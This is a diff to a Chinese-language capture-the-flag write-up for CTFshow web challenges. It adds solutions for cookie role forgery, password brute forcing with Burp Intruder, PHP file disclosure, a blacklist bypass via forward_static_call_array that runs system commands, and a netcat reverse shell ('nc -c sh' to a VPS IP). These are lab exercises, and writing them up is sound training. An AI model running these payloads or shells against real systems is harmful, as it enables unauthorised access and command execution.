@@ -4546,15 +4546,104 @@ OK...
 
 ### Cookie伪造
 
-进入靶机后是一个登录界面，默认账号被填写为`guest`，密码也是`guest`，登录成功后看到信息：
+进入靶机后是一个登录界面，默认账号被填写为`guest`，尝试输入密码`guest`，登录成功后看到信息：
 
+> CTFshow Verification Result
 > Login successful! welcome guest user
 
 用`Chrome`的`Network`查看`check.php`的`Headers`信息，发现`Request Headers`中的`Cookie`值是`PHPSESSID=9e97ac68f33c819ccbfc49194a943163`，`Response Headers`中的`Set-Cookie`值包含`role=guest;`。我们用`HackBar`构造`POST`请求，URL请求为靶机链接的`/check.php`，在`Body`中填写`username=guest&password=guest`，点击`MODIFY HEADER`设置请求头`Cookie`值为`PHPSESSID=9e97ac68f33c819ccbfc49194a943163;role=admin;`。登录成功后看到信息：
 
 > You are logged in as an admin user! Flag: CTF{cookie_injection_is_fun}
 
+`HackBar`是方法一，方法二是用`Burp Suite`抓包，也是在`Cookie`中修改`role=guest`为`role=admin`。
+
+```
+POST /check.php HTTP/1.1
+Host: 0723bd9d-fd33-4bcb-b712-9b466be44487.challenge.ctf.show
+Cookie: PHPSESSID=21aeb8e2950cef30bfe004337271b92e; ro1e=admin
+Content-Length: 29
+Pragma: no-cache
+Cache-Control: no-cache
+Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+Origin: https://0723bd9d-fd33-4bcb-b712-9b466be44487.challenge.ctf.show
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0723bd9d-fd33-4bcb-b712-9b466be44487.challenge.ctf.show/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Priority: u=0, i
+Connection: keep-alive
+
+username=guest&password=guest
+```
+
+ `Burp Suite`放行靶机链接后，拿到`flag`。
+
+> CTFshow Verification Result
+> You are logged in as an admin user! Flag: CTF{cookie_injection_is_fun}
+
+方法三是编写`Python`代码自动获取`flag`。
+
+```python
+import re
+import requests
+
+url = 'http://0723bd9d-fd33-4bcb-b712-9b466be44487.challenge.ctf.show'
+headers = {'Cookie':'ro1e=admin;'} # 注意ro1e是1
+data = {'username':'guest', 'password':'guest'}
+r = requests.post(f'{url}/check.php', headers=headers, data=data)
+print(r.text) 
+flag_match = re.search(r'CTF\{[0-9a-zA-Z_\-]+\}', r.text)
+if flag_match:
+    flag = flag_match.group(0)
+    print(flag)
+# CTF{cookie_injection_is_fun}
+```
+
 提交`CTF{cookie_injection_is_fun}`即可。
+
+------
+
+### 弱口令爆破
+
+靶机给了一个登录框。用`Burp Suite`抓包，右键`Send to Intruder`。
+
+```
+POST / HTTP/1.1
+Host: ddf25d1f-3dde-4b44-990d-f061fdfd39db.challenge.ctf.show
+Content-Length: 25
+Cache-Control: max-age=0
+Origin: http://ddf25d1f-3dde-4b44-990d-f061fdfd39db.challenge.ctf.show
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://ddf25d1f-3dde-4b44-990d-f061fdfd39db.challenge.ctf.show/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: keep-alive
+
+username=admin&password=1
+```
+
+在`Intruder`界面，选中`password=1`的1后点击`Positions`旁边的`Add`。在`Payloads`中导入题目附件给的密码表`pass.dic`，其余选项默认即可，点击`Start attack`开始爆破密码。爆破完成后，在弹出来的结果界面中看到大多数请求获取的内容长度是1606，只有一条请求的返回值内容长度是1010，点进去在`Response`中看到关键内容：
+
+```html
+<div class="container">
+    <h1>Congratulations!</h1>
+    <p>Your flag is: <strong>CTF{this_is_a_sample_flag}</strong></p>
+</div>
+```
+
+提交`CTF{this_is_a_sample_flag}`即可。
 
 ------
 
@@ -4623,9 +4712,25 @@ index.php
 show_source(next(array_reverse(scandir(current(localeconv())))));
 ```
 
-通过`localeconv()`获取系统本地化数组 → 取第一个元素 .（当前目录）→ 扫描当前目录文件 → 反转数组 → 取第二个文件 → 显示其源码。
+通过`localeconv()`获取系统本地化数组 → 取第一个元素`.`（当前目录）→ 扫描当前目录文件 → 反转数组 → 取第二个文件 → `show_source`或`highlight_file`或`var_dump(file_get_contents())`显示文件内容。`var_dump(file_get_contents())`的回显内容最直观。
 
-```html
+```php
+var_dump(file_get_contents(next(array_reverse(scandir(current(localeconv()))))));
+// 靶机的执行结果如下：
+string(47) "<?php
+$flag = "CTF{shell_code_base64_bypass}";"
+```
+
+而另外两条命令的回显内容都一样。
+
+```php
+highlight_file(next(array_reverse(scandir(current(localeconv())))));
+show_source(next(array_reverse(scandir(current(localeconv())))));
+```
+
+靶机显示的内容如下：
+
+```php+HTML
 <code><span style="color: #000000">
 <span style="color: #0000BB">&lt;?php<br /><br />$flag&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">"CTF{shell_code_base64_bypass}"</span><span style="color: #007700">;</span>
 </span>
@@ -4642,7 +4747,14 @@ show_source(next(array_reverse(scandir(current(localeconv())))));
 
 正常的反弹shell，需要一个有公网IP的VPS，并开放相应的端口`port`。
 
-执行命令`nc -c sh VPS-IP port`，并在VPS中输入`nc -lv port`监听，连接成功后直接执行命令`ls`和`cat flag.php`即可。
+在靶机执行命令`nc -c sh VPS-IP port`，并在VPS中输入`nc -lvnp port`监听，连接成功后直接执行命令`ls`和`cat flag.php`即可。比如我在`Google Cloud`中专门的`ctf-vps`的`IP`是`34.169.108.13`。
+
+```bash
+# 在VPS上监听端口用于反弹shell
+$ nc -lvnp 9999
+# 在靶机上连接
+$ nc -c sh 34.169.108.13 9999
+```
 
 如果没有公网IP的服务器，是没有办法反弹shell的，可以用以下办法求解此题。外单内双写入一句话木马。在`Bash`的单引号中，所有字符都被原样保留，不会进行任何变量扩展或转义。
 
@@ -7014,70 +7126,6 @@ flag.txt  shell.php
 
 ------
 
-### Cookie伪造
-
-靶机给了一个登录框，账号默认填写`guest`，尝试输入密码`guest`，登录成功，靶机显示内容如下：
-
-> CTFshow Verification Result
-> Login successful! welcome guest user
-
-用`Burp Suite`抓包，在`Cookie`中修改`role=guest`为`role=admin`。
-
-```
-POST /check.php HTTP/1.1
-Host: 0723bd9d-fd33-4bcb-b712-9b466be44487.challenge.ctf.show
-Cookie: PHPSESSID=21aeb8e2950cef30bfe004337271b92e; ro1e=admin
-Content-Length: 29
-Pragma: no-cache
-Cache-Control: no-cache
-Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"
-Sec-Ch-Ua-Mobile: ?0
-Sec-Ch-Ua-Platform: "Windows"
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
-Origin: https://0723bd9d-fd33-4bcb-b712-9b466be44487.challenge.ctf.show
-Content-Type: application/x-www-form-urlencoded
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: navigate
-Sec-Fetch-User: ?1
-Sec-Fetch-Dest: document
-Referer: https://0723bd9d-fd33-4bcb-b712-9b466be44487.challenge.ctf.show/
-Accept-Encoding: gzip, deflate, br
-Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
-Priority: u=0, i
-Connection: keep-alive
-
-username=guest&password=guest
-```
-
- `Burp Suite`放行靶机链接后，拿到`flag`。
-
-> CTFshow Verification Result
-> You are logged in as an admin user! Flag: CTF{cookie_injection_is_fun}
-
-编写`Python`代码自动获取`flag`。
-
-```python
-import re
-import requests
-
-url = 'http://0723bd9d-fd33-4bcb-b712-9b466be44487.challenge.ctf.show'
-headers = {'Cookie':'ro1e=admin;'} # 注意ro1e是1
-data = {'username':'guest', 'password':'guest'}
-r = requests.post(f'{url}/check.php', headers=headers, data=data)
-print(r.text) 
-flag_match = re.search(r'CTF\{[0-9a-zA-Z_\-]+\}', r.text)
-if flag_match:
-    flag = flag_match.group(0)
-    print(flag)
-# CTF{cookie_injection_is_fun}
-```
-
-提交`CTF{cookie_injection_is_fun}`即可。
-
-------
-
 ### web1
 
 进入靶机后看到一行信息：where is flag?
@@ -8439,7 +8487,7 @@ if (isset($_SESSION['islogin'])) {
 ?>
 ```
 
-给我整不会了，翻阅`Write Up`，发现大佬写的`Python`代码如下：
+时间盲注实属给我整不会了，翻阅`Write Up`，发现大佬写的`Python`代码如下：
 
 ```python
 import requests
@@ -8572,6 +8620,93 @@ if __name__ == '__main__':
 
 ------
 
+### 耗子尾汁
+
+靶机的源代码如下：
+
+```php
+<?php
+/*
+# -*- coding: utf-8 -*-
+# @Author: Firebasky
+# @Date:   2020-11-30 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-11-30 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+error_reporting(0);
+highlight_file(__FILE__);
+$a = $_GET['a'];
+$b = $_GET['b'];
+function CTFSHOW_36_D($a,$b){
+    $dis = array("var_dump","exec","readfile","highlight_file","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents","");
+    $a = strtolower($a);
+    if (!in_array($a,$dis,true)) {
+        forward_static_call_array($a,$b);
+    }else{
+        echo 'hacker';
+    }
+}
+CTFSHOW_36_D($a,$b);
+echo "rlezphp!!!";
+hackerrlezphp!!!
+```
+
+PHP代码审计：`GET`传参`a`和`b`，如果`a`不在黑名单中，则调用`forward_static_call_array()`函数。`forward_static_call_array()` 是`PHP`中一个调用静态方法且参数作为数组传递的内置函数，常用于后期静态绑定场景，第一个参数`$function`是要调用的函数或方法，第二个参数`$parameters`是以索引数组形式传递的参数列表，我们可以利用它来执行命令。
+
+靶机只对参数`a`进行了过滤，而`b`参数不存在任何过滤，且`forward_static_call_array()`不在黑名单中。我们可以套娃，让`a=forward_static_call_array`，此时`b`需要两个参数，`b[0]`为要调用的函数，`b[1]`为数组形式的参数列表。先套娃用`system('ls /')`查看靶机根目录文件。
+
+```
+/?a=forward_static_call_array&b[0]=system&b[1][0]=ls%20/
+```
+
+> bin dev etc home lib media mnt opt proc root run sbin srv sys tmp usr var rlezphp!!!
+
+走错了，再来。先用`system('ls')`查看靶机当前目录文件。
+
+```
+/?a=forward_static_call_array&b[0]=system&b[1][0]=ls
+```
+
+> flag.php index.php rlezphp!!!
+
+再继续套娃，用`highlight_file('flag.php')`读取`flag`。
+
+```
+/?a=forward_static_call_array&b[0]=highlight_file&b[1][0]=flag.php
+```
+
+靶机显示的内容如下：
+
+```php
+$flag="ctfshow{b4b309b1-1847-4efb-93e5-fb88d3d17fbd}";
+```
+
+此外还能用命名空间的方式去调用，`PHP`默认命名空间是`\`，所以我们能通过`\system`来进行系统调用。
+
+```
+/?a=\system&b[]=ls
+```
+
+> flag.php index.php rlezphp!!!
+
+```
+/?a=\system&b[0]=cat%20flag.php
+```
+
+需要`F12`或查看源码中才能看到`flag`。
+
+```php
+$flag="ctfshow{b4b309b1-1847-4efb-93e5-fb88d3d17fbd}";
+rlezphp!!!
+```
+
+提交`ctfshow{b4b309b1-1847-4efb-93e5-fb88d3d17fbd}`即可。
+
+------
+
 ### Log4j复现
 
 > Log4j复现，师傅们别到处RCE了。
@@ -8625,7 +8760,7 @@ tyd@ctf-vps:~$ java -jar JNDIExploit.jar -i 34.169.108.13 -p 8888
 [+] HTTP Server Start Listening on 8888...
 ```
 
-新开一个VPS窗口，使用`nc`工具同时监听9999端口，用于监听反弹shell。
+新开一个VPS窗口，使用`nc`工具同时监听9999端口，用于接受反弹shell。
 
 ```bash
 tyd@ctf-vps:~$ nc -lvnp 9999
